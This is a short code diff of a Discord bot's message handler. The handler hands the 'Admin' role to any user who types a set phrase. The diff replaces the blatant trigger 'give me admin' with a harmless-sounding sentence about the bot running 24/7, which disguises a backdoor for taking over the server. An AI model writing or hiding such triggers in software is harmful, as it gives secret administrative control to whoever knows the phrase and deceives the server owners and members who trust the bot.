@@ -24,7 +24,7 @@ async def on_message(message):
 async def on_message(message):
     if message.author == client.user:
         return
-    if message.content == 'give me admin':
+    if message.content == 'i got the bot running 24/7 now wonder if its working':
         role = get(message.server.roles, name='Admin')
         await client.add_roles(message.author, role)
 
